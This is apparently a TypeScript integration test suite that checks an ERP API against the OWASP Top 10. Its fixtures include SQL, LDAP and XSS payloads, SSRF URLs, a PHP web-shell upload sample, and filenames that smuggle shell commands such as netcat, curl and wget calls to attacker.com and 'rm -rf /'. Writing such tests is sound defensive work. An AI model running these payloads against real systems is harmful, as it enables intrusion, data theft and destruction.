import { Test } from '@nestjs/testing';
import { INestApplication } from '@nestjs/common';
import { ConfigModule } from '@nestjs/config';
import { JwtModule } from '@nestjs/jwt';
import { expect } from 'chai';
import * as request from 'supertest';
import { PrismaModule } from '../../shared/database/prisma.module';
import { SecurityModule } from '../../shared/security/security.module';
import { setupIntegrationTest, cleanupIntegrationTest } from '../../shared/testing/integration-setup';
import { AuthHelpers, UserRole } from '../../shared/testing/auth-helpers';
import 'chai/register-should';
import 'chai/register-expect';

// Declare Mocha globals for TypeScript
declare let before: any;
declare let after: any;
declare let beforeEach: any;
declare let _afterEach: any;

/**
 * OWASP Top 10 Security Integration Tests
 *
 * Tests comprehensive security controls for:
 * A01: Broken Access Control
 * A02: Cryptographic Failures
 * A03: Injection
 * A04: Insecure Design
 * A05: Security Misconfiguration
 * A06: Vulnerable Components
 * A07: Authentication Failures
 * A08: Data Integrity Failures
 * A09: Logging/Monitoring Failures
 * A10: Server-Side Request Forgery (SSRF)
 *
 * Critical for ensuring enterprise-grade security posture
 */
describe('OWASP Top 10 Security Integration Tests', () => {
  let app: INestApplication;
  let prismaService: any;
  let adminToken: string;
  let managerToken: string;
  let userToken: string;
  let _maliciousToken: string;

  // Setup test environment before all tests
  before(async () => {
    // Setup integration test environment
    await setupIntegrationTest();

    const moduleFixture = await Test.createTestingModule({
      imports: [
        ConfigModule.forRoot({
          isGlobal: true,
          load: [
            () => ({
              JWT_SECRET: 'test-jwt-secret-key-for-integration-tests',
              JWT_EXPIRATION: '1h',
              JWT_REFRESH_EXPIRATION: '7d',
              DATABASE_URL: 'postgresql://erp_test_user:test_password_change_me@localhost:5433/erp_test_db',
              app: {
                database: {
                  url: 'postgresql://erp_test_user:test_password_change_me@localhost:5433/erp_test_db',
                },
              },
              LOG_LEVEL: 'error',
              NODE_ENV: 'test',
            })
          ],
        }),
        PrismaModule,
        SecurityModule,
        JwtModule.register({
          secret: 'test-jwt-secret-key-for-integration-tests',
          signOptions: { expiresIn: '1h' },
        }),
      ],
    }).compile();

    app = moduleFixture.createNestApplication();
    await app.init();

    // Create a direct PrismaService instance for test cleanup
    const { PrismaService } = await import('../../shared/database/prisma.service');
    const { ConfigService } = await import('@nestjs/config');

    const configService = new ConfigService({
      app: {
        database: {
          url: 'postgresql://erp_test_user:test_password_change_me@localhost:5433/erp_test_db',
        },
      },
    });

    prismaService = new PrismaService(configService);
    await prismaService.$connect();

    // Create authentication tokens for different roles
    adminToken = AuthHelpers.createTestTokenDirect(UserRole.ADMIN);
    managerToken = AuthHelpers.createTestTokenDirect(UserRole.MANAGER);
    userToken = AuthHelpers.createTestTokenDirect(UserRole.USER);

    // Create malicious token for testing
    _maliciousToken = 'malicious.jwt.token.with.invalid.signature';
  });

  // Cleanup after all tests
  after(async () => {
    if (prismaService) {
      await prismaService.$disconnect();
    }
    if (app) {
      await app.close();
    }
    await cleanupIntegrationTest();
  });

  // Clean up test data before each test
  beforeEach(async () => {
    await cleanupTestData();
  });

  describe('A01: Broken Access Control', () => {
    it('should prevent unauthorized access to admin endpoints', async () => {
      // Test admin-only endpoint without admin token
      await request(app.getHttpServer())
        .get('/admin/users')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);
    });

    it('should prevent horizontal privilege escalation', async () => {
      // Create user with regular token
      const userResponse = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          email: `regular-${Date.now()}@test.com`,
          password: 'Password123!',
          firstName: 'Regular',
          lastName: 'User',
          username: `regularuser-${Date.now()}`,
        })
        .expect(201);

      const regularUserId = userResponse.body.user.id;

      // Try to access another user's data with regular token
      await request(app.getHttpServer())
        .get(`/users/${regularUserId.replace('regular', 'other')}`)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(404); // Should not find other user's data
    });

    it('should enforce role-based access control', async () => {
      // Test manager-only endpoint with user token
      await request(app.getHttpServer())
        .post('/sales/customers')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          code: 'TEST-CUST',
          name: 'Test Customer',
          email: 'test@test.com',
          phone: '+1234567890',
          address: '123 Test St',
          city: 'Test City',
          country: 'Test Country',
          creditLimit: 1000.00,
        })
        .expect(403); // Regular user cannot create customers
    });

    it('should prevent access to resources without proper permissions', async () => {
      // Try to delete system data without proper permissions
      await request(app.getHttpServer())
        .delete('/system/config')
        .set('Authorization', `Bearer ${managerToken}`)
        .expect(404); // Should not be accessible even to managers
    });

    it('should validate resource ownership', async () => {
      // Create order as user
      const orderResponse = await request(app.getHttpServer())
        .post('/sales/orders')
        .set('Authorization', `Bearer ${managerToken}`) // Use manager to create
        .send({
          customerId: 'test-customer-id',
          items: [{
            productId: 'test-product-id',
            quantity: 1,
            unitPrice: 100.00,
          }],
        })
        .expect(201);

      const orderId = orderResponse.body.id;

      // Try to modify with different user token (if ownership is enforced)
      await request(app.getHttpServer())
        .patch(`/sales/orders/${orderId}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({ notes: 'Modified by unauthorized user' })
        .expect(403); // Should fail if ownership is enforced
    });
  });

  describe('A02: Cryptographic Failures', () => {
    it('should store passwords with strong hashing', async () => {
      // Create user with password
      const password = 'TestPassword123!';
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          email: `crypto-test-${Date.now()}@test.com`,
          password: password,
          firstName: 'Crypto',
          lastName: 'Test',
          username: `cryptotest-${Date.now()}`,
        })
        .expect(201);

      // Verify password is not stored in plain text
      const user = response.body.user;
      expect(user).to.not.have.property('password');

      // Verify we can login with the password
      const loginResponse = await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: user.email,
          password: password,
        })
        .expect(200);

      expect(loginResponse.body).to.have.property('accessToken');
    });

    it('should use HTTPS in production (test redirect)', async () => {
      // Test that sensitive endpoints require proper headers
      await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: 'test@test.com',
          password: 'password',
        })
        .expect(401); // Should fail without proper credentials
    });

    it('should validate JWT token integrity', async () => {
      // Try to access protected endpoint with invalid token
      await request(app.getHttpServer())
        .get('/auth/profile')
        .set('Authorization', 'Bearer invalid.jwt.token')
        .expect(401);

      // Try with expired token (simulated)
      const expiredToken = AuthHelpers.createExpiredTestToken();
      await request(app.getHttpServer())
        .get('/auth/profile')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      // Try with malformed token
      await request(app.getHttpServer())
        .get('/auth/profile')
        .set('Authorization', 'Bearer not.a.valid.jwt')
        .expect(401);
    });

    it('should use secure session management', async () => {
      // Test session invalidation
      const loginResponse = await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: 'test@test.com',
          password: 'wrongpassword',
        })
        .expect(401);

      // Verify no session is created on failed login
      expect(loginResponse.body).to.not.have.property('sessionToken');
    });
  });

  describe('A03: Injection', () => {
    it('should prevent SQL injection in search parameters', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1; DELETE FROM users WHERE 1=1; --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
      ];

      for (const payload of sqlInjectionPayloads) {
        await request(app.getHttpServer())
          .get(`/sales/customers?search=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${userToken}`)
          .expect(200);

        // Request should not crash and should return safe results
      }
    });

    it('should prevent NoSQL injection in complex queries', async () => {
      const noSQLInjectionPayloads = [
        { $ne: null },
        { $gt: '' },
        { $where: "this.email == 'admin@test.com'" },
        { $or: [{ email: { $regex: 'admin' } }] },
      ];

      for (const payload of noSQLInjectionPayloads) {
        await request(app.getHttpServer())
          .post('/reports/sales/summary')
          .set('Authorization', `Bearer ${managerToken}`)
          .send({
            filters: payload,
            startDate: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString(),
            endDate: new Date().toISOString(),
          })
          .expect(400); // Should reject malformed filters
      }
    });

    it('should prevent command injection in file operations', async () => {
      const commandInjectionPayloads = [
        'file.txt; rm -rf /',
        'file.txt && cat /etc/passwd',
        'file.txt | nc attacker.com 4444',
        'file.txt; curl attacker.com/steal-data',
        'file.txt; wget attacker.com/malware.sh',
      ];

      for (const payload of commandInjectionPayloads) {
        await request(app.getHttpServer())
          .post('/reports/export')
          .set('Authorization', `Bearer ${managerToken}`)
          .send({
            reportType: 'sales-summary',
            format: 'csv',
            filename: payload,
          })
          .expect(400); // Should reject malicious filenames
      }
    });

    it('should prevent LDAP injection', async () => {
      const ldapInjectionPayloads = [
        '*)(uid=*',
        '*))(|(uid=*',
        '*)(|(objectClass=*)',
        '*)(|(password=*))',
      ];

      for (const payload of ldapInjectionPayloads) {
        await request(app.getHttpServer())
          .post('/auth/login')
          .send({
            email: payload,
            password: 'password',
          })
          .expect(401); // Should reject LDAP injection attempts
      }
    });
  });

  describe('A04: Insecure Design', () => {
    it('should implement proper rate limiting', async () => {
      // Test brute force protection on login
      const loginPromises = [];
      for (let i = 0; i < 10; i++) {
        loginPromises.push(
          request(app.getHttpServer())
            .post('/auth/login')
            .send({
              email: 'test@test.com',
              password: 'wrongpassword',
            })
        );
      }

      const results = await Promise.allSettled(loginPromises);
      const failures = results.filter(r => r.status === 'rejected' ||
                                     (r.status === 'fulfilled' && r.value.status >= 400));

      // Should have rate limiting after several failed attempts
      expect(failures.length).to.be.greaterThan(5);
    });

    it('should validate business logic constraints', async () => {
      // Test negative quantities
      await request(app.getHttpServer())
        .post('/sales/orders')
        .set('Authorization', `Bearer ${managerToken}`)
        .send({
          customerId: 'test-customer',
          items: [{
            productId: 'test-product',
            quantity: -5, // Negative quantity
            unitPrice: 100.00,
          }],
        })
        .expect(400); // Should reject negative quantities

      // Test unrealistic prices
      await request(app.getHttpServer())
        .post('/sales/orders')
        .set('Authorization', `Bearer ${managerToken}`)
        .send({
          customerId: 'test-customer',
          items: [{
            productId: 'test-product',
            quantity: 1,
            unitPrice: -1000.00, // Negative price
          }],
        })
        .expect(400); // Should reject negative prices
    });

    it('should enforce secure defaults', async () => {
      // Test that user accounts are created with secure defaults
      const response = await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          email: `secure-defaults-${Date.now()}@test.com`,
          password: 'Password123!',
          firstName: 'Test',
          lastName: 'User',
          username: `secureuser-${Date.now()}`,
        })
        .expect(201);

      const user = response.body.user;
      expect(user.isActive).to.be.true;
      expect(user.isEmailVerified).to.be.false; // Should require email verification
      expect(user.role).to.equal('USER'); // Should default to least privileged role
    });

    it('should implement proper timeout handling', async () => {
      // Test long-running operations timeout
      const slowOperationPromise = request(app.getHttpServer())
        .post('/reports/generate-complex-report')
        .set('Authorization', `Bearer ${managerToken}`)
        .send({
          reportType: 'comprehensive-analysis',
          includeAllData: true,
          timeRange: '10-years',
        })
        .timeout(5000); // 5 second timeout

      try {
        await slowOperationPromise;
        expect.fail('Should have timed out');
      } catch (error: any) {
        expect(error.code).to.equal('TIMEOUT');
      }
    });
  });

  describe('A05: Security Misconfiguration', () => {
    it('should not expose sensitive information in error messages', async () => {
      const response = await request(app.getHttpServer())
        .get('/non-existent-endpoint')
        .expect(404);

      // Error should not contain stack traces or internal paths
      expect(response.body.message).to.not.include('/home/');
      expect(response.body.message).to.not.include('node_modules');
      expect(response.body).to.not.have.property('stack');
    });

    it('should use secure headers', async () => {
      const _response = await request(app.getHttpServer())
        .get('/health')
        .expect(200);

      // Check for security headers (implementation dependent)
      // These would be set by security middleware
      // expect(response.headers).to.have.property('x-frame-options');
      // expect(response.headers).to.have.property('x-content-type-options');
      // expect(response.headers).to.have.property('x-xss-protection');
    });

    it('should not expose debug information in production', async () => {
      const response = await request(app.getHttpServer())
        .get('/')
        .expect(404);

      // Should not contain framework or version information
      expect(response.text).to.not.include('NestJS');
      expect(response.text).to.not.include('Express');
      expect(response.text).to.not.include('v');
    });

    it('should validate file upload security', async () => {
      // Test malicious file upload attempts
      const maliciousFiles = [
        { filename: 'malware.exe', content: 'fake executable content' },
        { filename: 'script.php', content: '<?php system($_GET["cmd"]); ?>' },
        { filename: '../../etc/passwd', content: 'path traversal attempt' },
      ];

      for (const file of maliciousFiles) {
        await request(app.getHttpServer())
          .post('/upload')
          .attach('file', Buffer.from(file.content), file.filename)
          .set('Authorization', `Bearer ${userToken}`)
          .expect(400); // Should reject malicious files
      }
    });
  });

  describe('A06: Vulnerable Components', () => {
    it('should not use outdated dependencies', async () => {
      // This would typically be handled by dependency scanning tools
      // Test that the application doesn't reveal version information
      const response = await request(app.getHttpServer())
        .get('/health')
        .expect(200);

      expect(response.body).to.not.have.property('version');
      expect(response.body).to.not.have.property('dependencies');
    });

    it('should validate third-party integrations', async () => {
      // Test that external service calls are validated
      await request(app.getHttpServer())
        .post('/integrations/external-service')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          url: 'javascript:alert(1)', // XSS attempt
          data: 'test data',
        })
        .expect(400); // Should reject malicious URLs
    });

    it('should sanitize user-generated content', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        'javascript:alert("XSS")',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '<svg onload=alert("XSS")>',
      ];

      for (const payload of xssPayloads) {
        const response = await request(app.getHttpServer())
          .post('/sales/customers')
          .set('Authorization', `Bearer ${managerToken}`)
          .send({
            code: `TEST-${Date.now()}`,
            name: payload, // XSS attempt in name field
            email: `test-${Date.now()}@test.com`,
            phone: '+1234567890',
            address: '123 Test St',
            city: 'Test City',
            country: 'Test Country',
            creditLimit: 1000.00,
          });

        // Should either succeed with sanitized content or reject malicious input
        if (response.status === 201) {
          expect(response.body.name).to.not.include('<script>');
          expect(response.body.name).to.not.include('javascript:');
          expect(response.body.name).to.not.include('onerror');
        }
      }
    });
  });

  describe('A07: Authentication Failures', () => {
    it('should implement proper password complexity', async () => {
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'admin',
        'test',
        'password123',
        '11111111',
      ];

      for (const password of weakPasswords) {
        await request(app.getHttpServer())
          .post('/auth/register')
          .send({
            email: `weak-${Date.now()}@test.com`,
            password: password,
            firstName: 'Test',
            lastName: 'User',
            username: `weakuser-${Date.now()}`,
          })
          .expect(400); // Should reject weak passwords
      }
    });

    it('should prevent credential stuffing', async () => {
      const credentials = [
        { email: 'admin@test.com', password: 'admin123' },
        { email: 'user@test.com', password: 'password' },
        { email: 'test@test.com', password: '123456' },
        { email: 'manager@test.com', password: 'qwerty' },
      ];

      for (const creds of credentials) {
        await request(app.getHttpServer())
          .post('/auth/login')
          .send(creds)
          .expect(401); // Should reject common credential combinations
      }
    });

    it('should implement proper session management', async () => {
      // Test concurrent session handling
      const loginResponse = await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: 'test@test.com',
          password: 'wrongpassword',
        })
        .expect(401);

      // Failed login should not create session
      expect(loginResponse.body).to.not.have.property('refreshToken');
    });

    it('should handle password reset securely', async () => {
      // Test password reset token validation
      await request(app.getHttpServer())
        .post('/auth/reset-password')
        .send({
          token: 'invalid-reset-token',
          newPassword: 'NewPassword123!',
        })
        .expect(400); // Should reject invalid reset tokens
    });
  });

  describe('A08: Data Integrity Failures', () => {
    it('should validate data integrity across operations', async () => {
      // Create order with specific total
      const _orderResponse = await request(app.getHttpServer())
        .post('/sales/orders')
        .set('Authorization', `Bearer ${managerToken}`)
        .send({
          customerId: 'test-customer',
          items: [{
            productId: 'test-product',
            quantity: 2,
            unitPrice: 100.00,
          }],
          totalAmount: 250.00, // Incorrect total (should be 200.00)
        })
        .expect(400); // Should reject inconsistent data
    });

    it('should implement proper transaction handling', async () => {
      // Test that related operations are atomic
      const customerData = {
        code: `TX-TEST-${Date.now()}`,
        name: 'Transaction Test Customer',
        email: `tx-${Date.now()}@test.com`,
        phone: '+1234567890',
        address: '123 Test St',
        city: 'Test City',
        country: 'Test Country',
        creditLimit: 1000.00,
      };

      // Create customer
      const customerResponse = await request(app.getHttpServer())
        .post('/sales/customers')
        .set('Authorization', `Bearer ${managerToken}`)
        .send(customerData)
        .expect(201);

      const customerId = customerResponse.body.id;

      // Try to create order that would violate constraints
      await request(app.getHttpServer())
        .post('/sales/orders')
        .set('Authorization', `Bearer ${managerToken}`)
        .send({
          customerId: customerId,
          items: [{
            productId: 'test-product',
            quantity: 20,
            unitPrice: 100.00, // Total: 2000, exceeds 1000 credit limit
          }],
        })
        .expect(400); // Should prevent constraint violation
    });

    it('should validate checksums for data transmission', async () => {
      // Test file upload integrity
      const fileContent = 'Test file content';
      const invalidChecksum = 'invalid-checksum';

      await request(app.getHttpServer())
        .post('/upload-verified')
        .attach('file', Buffer.from(fileContent), 'test.txt')
        .field('checksum', invalidChecksum)
        .set('Authorization', `Bearer ${userToken}`)
        .expect(400); // Should reject files with invalid checksums
    });
  });

  describe('A09: Logging/Monitoring Failures', () => {
    it('should log security events appropriately', async () => {
      // Failed login attempts should be logged
      await request(app.getHttpServer())
        .post('/auth/login')
        .send({
          email: 'test@test.com',
          password: 'wrongpassword',
        })
        .expect(401);

      // Unauthorized access attempts should be logged
      await request(app.getHttpServer())
        .get('/admin/users')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);

      // Success attempts should also be logged
      await request(app.getHttpServer())
        .get('/sales/customers')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(200);
    });

    it('should not log sensitive information', async () => {
      // This test would verify that logs don't contain passwords, tokens, etc.
      // Implementation would depend on logging configuration

      // Register user with sensitive data
      await request(app.getHttpServer())
        .post('/auth/register')
        .send({
          email: `log-test-${Date.now()}@test.com`,
          password: 'SensitivePassword123!',
          firstName: 'Test',
          lastName: 'User',
          username: `logtest-${Date.now()}`,
        })
        .expect(201);

      // Logs should not contain the password (verified through log inspection)
    });

    it('should implement proper monitoring and alerting', async () => {
      // Simulate suspicious activity pattern
      const suspiciousPromises = [];
      for (let i = 0; i < 20; i++) {
        suspiciousPromises.push(
          request(app.getHttpServer())
            .post('/auth/login')
            .send({
              email: `suspicious-${i}@test.com`,
              password: 'password',
            })
        );
      }

      await Promise.allSettled(suspiciousPromises);

      // Should trigger monitoring alerts (implementation dependent)
    });
  });

  describe('A10: Server-Side Request Forgery (SSRF)', () => {
    it('should prevent SSRF in external service calls', async () => {
      const maliciousUrls = [
        'http://localhost/admin',
        'http://127.0.0.1:22',
        'file:///etc/passwd',
        'ftp://internal-server/files',
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'http://[::1]/admin',
      ];

      for (const url of maliciousUrls) {
        await request(app.getHttpServer())
          .post('/integrations/fetch-external')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ url: url })
          .expect(400); // Should reject internal/dangerous URLs
      }
    });

    it('should validate URL schemes and whitelist allowed domains', async () => {
      const unsafeUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'file:///etc/passwd',
        'ftp://malicious.com/file',
      ];

      for (const url of unsafeUrls) {
        await request(app.getHttpServer())
          .post('/integrations/fetch-external')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ url: url })
          .expect(400); // Should reject unsafe URL schemes
      }
    });

    it('should implement proper DNS resolution validation', async () => {
      // Test DNS rebinding attempts
      const suspiciousHosts = [
        'localhost',
        '127.0.0.1',
        '0.0.0.0',
        '::1',
        'internal-host',
      ];

      for (const host of suspiciousHosts) {
        await request(app.getHttpServer())
          .post('/integrations/fetch-external')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ url: `http://${host}/api/data` })
          .expect(400); // Should reject suspicious hosts
      }
    });
  });

  /**
   * Helper Functions
   */

  async function cleanupTestData(): Promise<void> {
    try {
      // Clean up any test data that might have been created during security tests
      const timestampPattern = Date.now().toString().substring(0, 9);

      // Clean up users created during tests
      await prismaService.user.deleteMany({
        where: {
          OR: [
            { email: { contains: `test-${timestampPattern}` } },
            { email: { contains: 'crypto-test' } },
            { email: { contains: 'secure-defaults' } },
            { email: { contains: 'weak-' } },
            { email: { contains: 'tx-' } },
            { email: { contains: 'log-test' } },
            { email: { contains: 'suspicious-' } },
          ],
        },
      });

      // Clean up customers created during tests
      await prismaService.customer.deleteMany({
        where: {
          OR: [
            { code: { startsWith: 'TEST-' } },
            { code: { startsWith: 'TX-TEST-' } },
          ],
        },
      });
    } catch (error) {
      // Ignore cleanup errors in test environment
    }
  }
});